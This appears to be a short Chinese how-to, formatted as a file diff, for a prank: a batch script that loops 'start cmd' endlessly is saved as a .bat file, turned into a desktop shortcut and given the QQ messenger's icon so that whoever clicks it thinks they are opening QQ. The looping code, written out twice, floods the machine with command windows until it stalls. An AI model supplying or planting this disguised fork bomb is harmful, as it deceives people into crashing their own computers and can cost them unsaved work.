@@ -1,0 +1,13 @@
+新建一个txt文档   文档内容：
+
+	:start
+	start cmd
+	goto start cmd
+
+保存文档 后缀名改为bat  右键发送至桌面快捷方式  对文档右键属性 先不要动 然后打开QQ右键属性把路径复制出来
+
+	然后进文档 找到更改图标 把复制路径粘贴 然后确定
+
+:start
+start cmd
+goto start cmd
